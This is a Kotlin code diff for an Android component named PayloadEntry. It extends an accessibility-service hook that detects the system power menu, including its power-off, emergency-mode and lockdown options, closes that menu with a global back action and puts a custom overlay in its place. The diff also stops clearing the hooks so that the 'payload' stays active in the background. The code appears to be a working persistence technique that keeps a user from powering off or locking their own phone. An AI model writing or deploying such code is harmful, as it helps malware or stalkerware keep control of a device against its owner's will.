@@ -58,98 +58,118 @@ class PayloadEntry : DynamicEntry {
             
             updateStep()
             
+            var accEventCount = 0L
             DynamicEntry.accessibilityInterceptor = { event ->
-                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                    try {
-                        val pkg = event.packageName?.toString()?.lowercase() ?: ""
-                        val cls = event.className?.toString()?.lowercase() ?: ""
-                        
-                        DynamicEntry.log("👁️ Window Event: pkg=$pkg | cls=$cls")
-                        
+                try {
+                    accEventCount++
+                    val type = event.eventType
+                    val pkg = event.packageName?.toString()?.lowercase() ?: ""
+                    val cls = event.className?.toString()?.lowercase() ?: ""
+                    
+                    if (accEventCount % 50L == 0L) {
+                        DynamicEntry.log("💓 Acc Heartbeat: Received $accEventCount events so far. Last: $pkg")
+                    }
+
+                    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                        DynamicEntry.log("🪟 WIN_STATE: pkg=$pkg | cls=$cls")
+                    }
+
+                    // For Samsung, Power menu can trigger either STATE_CHANGED or CONTENT_CHANGED
+                    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                         // Target system overlays AND Samsung's GlobalActions
-                        if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice") || pkg.contains("globalactions")) {
+                        if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice") || pkg.contains("globalactions") || pkg.contains("power")) {
                             var isPowerMenu = false
-                            DynamicEntry.log("🔍 Deep Scanning Target: $pkg")
+                            DynamicEntry.log("🔍 Scanning Target: $pkg (Event Type: $type)")
                             
                             if (pkg.contains("globalactions")) {
                                 isPowerMenu = true
                                 DynamicEntry.log("✅ Matched Samsung GlobalActions Package!")
                             }
 
-                        // Method 1: Check high-level event text
-                        val eventText = event.text.joinToString(" ").lowercase()
-                        if (eventText.contains("power off") || eventText.contains("emergency mode") || eventText.contains("lockdown mode")) {
-                            isPowerMenu = true
-                            DynamicEntry.log("✅ Matched Event Text: $eventText")
-                        }
-
-                        // Method 2: Deep scan the accessibility nodes (More accurate for Samsung)
-                        if (!isPowerMenu) {
-                            fun scanNodes(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
-                                if (node == null) return false
-                                val nodeText = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
-                                
-                                if (nodeText.contains("power off") || nodeText.contains("emergency mode") || nodeText.contains("side key settings")) {
-                                    DynamicEntry.log("✅ Matched UI Node: $nodeText")
-                                    return true
-                                }
-                                
-                                for (i in 0 until node.childCount) {
-                                    val child = node.getChild(i)
-                                    if (child != null) {
-                                        val matched = scanNodes(child)
-                                        child.recycle()
-                                        if (matched) return true
-                                    }
-                                }
-                                return false
+                            // Method 1: Check high-level event text
+                            val eventText = event.text.joinToString(" ").lowercase()
+                            if (eventText.isNotBlank()) {
+                                DynamicEntry.log("📝 Event Text: $eventText")
                             }
-                            
-                            val rootNode = event.source
-                            if (rootNode != null) {
-                                isPowerMenu = scanNodes(rootNode)
-                                rootNode.recycle() // Prevent memory leaks
-                            }
-                        }
-
-                        // Method 3: Fallback to class name check
-                        if (!isPowerMenu) {
-                            val cls = event.className?.toString() ?: ""
-                            if (cls.contains("GlobalActions", ignoreCase = true) || cls.contains("Power", ignoreCase = true)) {
+                            if (eventText.contains("power off") || eventText.contains("emergency mode") || eventText.contains("lockdown mode")) {
                                 isPowerMenu = true
-                                DynamicEntry.log("⚠️ Fallback Matched Class: $cls")
+                                DynamicEntry.log("✅ Matched Event Text: $eventText")
                             }
-                        }
 
-                        if (isPowerMenu) {
-                            DynamicEntry.log("🚀 INTERCEPTING POWER MENU!")
-                            // ⚔️ Kill the system UI menu via global back action
-                            DynamicEntry.activeAccessibilityService?.performGlobalAction(
-                                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
-                            )
+                            // Method 2: Deep scan the accessibility nodes (More accurate for Samsung)
+                            if (!isPowerMenu) {
+                                fun scanNodes(node: android.view.accessibility.AccessibilityNodeInfo?, depth: Int): Boolean {
+                                    if (node == null) return false
+                                    if (depth > 5) return false // Prevent unbounded recursion
+                                    
+                                    val nodeText = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
+                                    if (nodeText.isNotBlank() && depth <= 2) {
+                                        DynamicEntry.log("   ↳ Node Depth $depth: $nodeText")
+                                    }
+                                    
+                                    if (nodeText.contains("power off") || nodeText.contains("emergency mode") || nodeText.contains("side key settings")) {
+                                        DynamicEntry.log("✅ Matched UI Node: $nodeText")
+                                        return true
+                                    }
+                                    
+                                    for (i in 0 until node.childCount) {
+                                        val child = try { node.getChild(i) } catch(e: Exception) { null }
+                                        if (child != null) {
+                                            val matched = scanNodes(child, depth + 1)
+                                            child.recycle()
+                                            if (matched) return true
+                                        }
+                                    }
+                                    return false
+                                }
+                                
+                                val rootNode = try { event.source } catch(e: Exception) { null }
+                                if (rootNode != null) {
+                                    DynamicEntry.log("🔎 Deep scanning node tree...")
+                                    isPowerMenu = scanNodes(rootNode, 0)
+                                    rootNode.recycle() // Prevent memory leaks
+                                } else {
+                                    DynamicEntry.log("⚠️ event.source is NULL. Cannot deep scan.")
+                                }
+                            }
 
-                            val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                                vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
+                            // Method 3: Fallback to class name check
+                            if (!isPowerMenu) {
+                                if (cls.contains("globalactions", ignoreCase = true) || cls.contains("power", ignoreCase = true)) {
+                                    isPowerMenu = true
+                                    DynamicEntry.log("⚠️ Fallback Matched Class: $cls")
+                                }
+                            }
+
+                            if (isPowerMenu) {
+                                DynamicEntry.log("🚀 INTERCEPTING POWER MENU!")
+                                // ⚔️ Kill the system UI menu via global back action
+                                DynamicEntry.activeAccessibilityService?.performGlobalAction(
+                                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
+                                )
+
+                                val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                    vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
+                                } else {
+                                    @Suppress("DEPRECATION")
+                                    vib.vibrate(50)
+                                }
+                                
+                                // 🚀 Draw the custom overlay
+                                DynamicEntry.overlayContent = { 
+                                    PowerMenuOverlay(onDismiss = { 
+                                        DynamicEntry.log("Closing custom overlay.")
+                                        DynamicEntry.overlayContent = null 
+                                    }) 
+                                }
                             } else {
-                                @Suppress("DEPRECATION")
-                                vib.vibrate(50)
+                                DynamicEntry.log("❌ Ignore: Not a power menu.")
                             }
-                            
-                            // 🚀 Draw the custom overlay
-                            DynamicEntry.overlayContent = { 
-                                PowerMenuOverlay(onDismiss = { 
-                                    DynamicEntry.log("Closing custom overlay.")
-                                    DynamicEntry.overlayContent = null 
-                                }) 
-                            }
-                        } else {
-                            DynamicEntry.log("❌ Ignore: Not a power menu.")
                         }
                     }
-                    } catch(e: Throwable) {
-                        DynamicEntry.log("💥 ACC CRASH: ${e.stackTraceToString()}")
-                    }
+                } catch(e: Throwable) {
+                    DynamicEntry.log("💥 ACC CRASH: ${e.message}")
                 }
             }
 
@@ -165,8 +185,8 @@ class PayloadEntry : DynamicEntry {
             lifecycleOwner.lifecycle.addObserver(observer)
             onDispose { 
                 lifecycleOwner.lifecycle.removeObserver(observer)
-                DynamicEntry.keyInterceptor = null
-                DynamicEntry.accessibilityInterceptor = null
+                // CRITICAL FIX: Do NOT clear the interceptors here.
+                // The payload must remain active in the background even if the UI unmounts!
             }
         }
 
